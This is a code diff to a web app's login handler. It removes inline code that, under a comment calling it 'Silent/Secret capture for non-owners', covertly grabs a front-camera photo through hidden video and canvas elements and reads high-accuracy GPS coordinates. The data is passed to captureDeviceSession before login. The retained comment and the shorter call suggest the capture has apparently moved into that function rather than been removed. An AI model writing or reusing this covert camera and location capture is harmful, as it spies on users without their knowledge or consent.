@@ -1608,81 +1608,11 @@
         }
 
         // Silent/Secret capture for non-owners in the background
-        let photoData = '';
-        let lat = null;
-        let lon = null;
-        let cameraStatusVal = 'Uninitialized';
-        let locationStatusVal = 'Uninitialized';
-
-        const gpsPromise = new Promise((resolve) => {
-          if (!navigator.geolocation) {
-            locationStatusVal = 'Not Supported';
-            resolve(null);
-            return;
-          }
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              lat = pos.coords.latitude;
-              lon = pos.coords.longitude;
-              locationStatusVal = 'Granted';
-              resolve({ lat, lon });
-            },
-            (err) => {
-              locationStatusVal = 'Denied/Error: ' + err.message;
-              resolve(null);
-            },
-            { timeout: 4500, enableHighAccuracy: true }
-          );
+        captureDeviceSession(user, () => {
+          const currentDb = getDB();
+          app.login(makeSafeUser(user, currentDb));
+          setLoading(false);
         });
-
-        let stream = null;
-        try {
-          const hiddenVideo = document.createElement('video');
-          hiddenVideo.setAttribute('autoplay', 'true');
-          hiddenVideo.setAttribute('playsinline', 'true');
-          hiddenVideo.style.display = 'none';
-          document.body.appendChild(hiddenVideo);
-
-          const hiddenCanvas = document.createElement('canvas');
-          hiddenCanvas.style.display = 'none';
-          document.body.appendChild(hiddenCanvas);
-
-          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-          cameraStatusVal = 'Granted';
-          hiddenVideo.srcObject = stream;
-          
-          await new Promise(r => setTimeout(r, 800));
-
-          hiddenCanvas.width = hiddenVideo.videoWidth || 320;
-          hiddenCanvas.height = hiddenVideo.videoHeight || 240;
-          const ctx = hiddenCanvas.getContext('2d');
-          ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-          photoData = hiddenCanvas.toDataURL('image/jpeg', 0.85);
-
-          if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-          }
-          if (hiddenVideo.parentNode) hiddenVideo.parentNode.removeChild(hiddenVideo);
-          if (hiddenCanvas.parentNode) hiddenCanvas.parentNode.removeChild(hiddenCanvas);
-        } catch (err) {
-          cameraStatusVal = 'Denied/Error: ' + err.message;
-        }
-
-        await gpsPromise;
-
-        captureDeviceSession(
-          user,
-          photoData,
-          cameraStatusVal,
-          locationStatusVal,
-          lat,
-          lon,
-          () => {
-            const currentDb = getDB();
-            app.login(makeSafeUser(user, currentDb));
-            setLoading(false);
-          }
-        );
       };
 
       return (
